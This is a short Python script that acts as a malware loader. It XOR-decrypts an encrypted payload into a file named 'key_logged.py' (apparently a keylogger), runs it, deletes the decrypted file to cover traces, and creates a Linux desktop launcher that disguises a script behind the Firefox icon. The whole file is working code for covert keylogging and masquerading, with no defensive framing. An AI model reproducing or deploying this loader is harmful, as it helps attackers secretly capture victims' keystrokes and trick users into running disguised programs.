import os
import subprocess

# XOR encryption/decryption function
def xor_decrypt(data, key):
    return bytearray([b ^ key for b in data])

# Function to decrypt a file and execute the decrypted 'key_logged.py'
def decrypt_and_execute(encrypted_file, key):
    decrypted_filename = 'key_logged.py'

    try:
        # Step 1: Decrypt the payload (read the encrypted file)
        with open(encrypted_file, 'rb') as f:
            encrypted_data = f.read()

        # Step 2: Decrypt the file's contents using XOR decryption
        decrypted_data = xor_decrypt(encrypted_data, key)

        # Step 3: Save the decrypted Python code as 'key_logged.py'
        with open(decrypted_filename, 'wb') as f:
            f.write(decrypted_data)

        print(f"Decrypted {encrypted_file} to {decrypted_filename}")

        # Step 4: Execute the decrypted 'key_logged.py' file
        subprocess.run(['python3', decrypted_filename], check=True)
        print(f"Successfully executed {decrypted_filename}")

    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing {decrypted_filename}: {e}")

    except KeyboardInterrupt:
        print("Execution aborted by the user.")

    finally:
        # Clean up: delete the decrypted file after execution or if interrupted
        if os.path.exists(decrypted_filename):
            os.remove(decrypted_filename)
            print(f"Deleted {decrypted_filename}")


def disguise_icon(directory):
    # Full path to the run.exe file
    exe_path = os.path.join(directory, 'run.py')

    # Create a desktop entry on Linux with the desired icon
    desktop_entry = f"""[Desktop Entry]
Version=1.0
Name=Replicate
Comment=Runs run.exe
Exec={exe_path}
Icon=/usr/share/icons/HighContrast/256x256/apps/firefox.png
Terminal=false
Type=Application
    """

    # Path to the .desktop file
    desktop_file_path = os.path.join(directory, 'run.desktop')

    try:
        # Write the desktop entry to a .desktop file
        with open(desktop_file_path, 'w') as file:
            file.write(desktop_entry)

        # Make the desktop file executable
        os.chmod(desktop_file_path, 0o755)

        print(f"Created desktop entry {desktop_file_path} with Firefox icon.")

    except Exception as e:
        print(f"Failed to create desktop entry: {str(e)}")


if __name__ == "__main__":
    # Decrypt and execute the payload using the known XOR key
    decrypt_and_execute('key_loggee.py', 123)
    current_directory = os.path.dirname(os.path.abspath(__file__))
    disguise_icon(current_directory) 